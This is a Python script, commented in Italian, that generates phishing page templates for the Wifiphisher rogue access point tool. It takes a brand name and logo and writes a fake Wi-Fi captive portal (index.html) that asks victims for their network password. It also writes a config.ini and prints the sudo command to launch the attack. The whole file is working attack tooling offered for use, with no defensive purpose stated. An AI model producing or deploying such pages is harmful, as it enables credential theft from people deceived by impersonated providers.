#!/usr/bin/env python3
import os
import base64
import re
from pathlib import Path
from PIL import Image

def main():
    print("=== Generatore Template Phishing per Wifiphisher ===")

    # Input nome scenario
    name = input("Inserisci il nome della nuova pagina phishing (es. TIM): ").strip()
    if not name:
        print("[!] Nome non valido.")
        return

    # Normalizza il nome: tutto minuscolo, niente spazi o simboli
    template_name = re.sub(r'\W+', '', name.lower())

    # Input immagine logo
    logo_path = input("Percorso immagine PNG da usare come logo: ").strip()
    if not os.path.isfile(logo_path):
        print(f"[!] Immagine non trovata: {logo_path}")
        return

    # Percorsi directory
    base_dir = Path("/usr/lib/python3/dist-packages/wifiphisher/data/phishing-pages")
    template_dir = base_dir / template_name
    html_dir = template_dir / "html"
    index_file = html_dir / "index.html"
    config_file = template_dir / "config.ini"

    print(f"[+] Creazione cartelle: {template_dir}")
    html_dir.mkdir(parents=True, exist_ok=True)

    # Imposta permessi
    os.system(f"sudo chown -R root:root '{template_dir}'")
    os.system(f"sudo chmod -R 755 '{template_dir}'")

    # Converte e codifica logo
    print("[+] Conversione immagine...")
    temp_png = "/tmp/logo_temp.png"
    with Image.open(logo_path) as img:
        img.convert("RGB").save(temp_png, format="PNG", optimize=True)
    with open(temp_png, "rb") as f:
        logo_b64 = base64.b64encode(f.read()).decode("utf-8")

    # HTML con logo inline + form password
    print("[+] Scrittura index.html...")
    html = f"""<!doctype html>
<html lang="it">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Accesso Wi‑Fi — {name}</title>
<style>
body{{font-family:sans-serif;background:#f5f7fa;margin:0;padding:0;}}
.container{{max-width:420px;margin:6vh auto;background:#fff;padding:24px;border-radius:8px;box-shadow:0 6px 20px rgba(0,0,0,0.08);text-align:center;}}
img.logo{{max-width:220px;height:auto;margin-bottom:12px;}}
input{{width:100%;padding:10px;margin:8px 0;font-size:16px;border-radius:6px;border:1px solid #ccc;}}
button{{width:100%;padding:12px;background:#ff6b00;color:white;border:none;border-radius:6px;font-weight:bold;cursor:pointer;}}
footer{{font-size:12px;color:#777;margin-top:12px;}}
</style>
</head>
<body>
<div class="container">
    <img src="data:image/png;base64,{logo_b64}" class="logo" alt="Logo">
    <h2>Connessione a {name}</h2>
    <p>Per continuare, inserisci la password della rete Wi‑Fi.</p>
    <form method="POST">
        <input type="password" name="password" placeholder="Password Wi-Fi" required>
        <button type="submit">Accedi</button>
    </form>
    <footer>{name} · captive portal</footer>
</div>
</body>
</html>
"""
    index_file.write_text(html, encoding="utf-8")

    # config.ini
    print("[+] Scrittura config.ini...")
    config = f"""[info]
Name = {name} - Accesso WiFi
Description = Scenario con logo inline generato automaticamente.

[context]
redirect_url = https://192.168.1.1
"""
    config_file.write_text(config, encoding="utf-8")

    # Output finale
    print(f"[✔] Template '{template_name}' creato in: {template_dir}")
    print(f"    Avvialo con: sudo wifiphisher -p {template_name}")

if __name__ == "__main__":
    main()
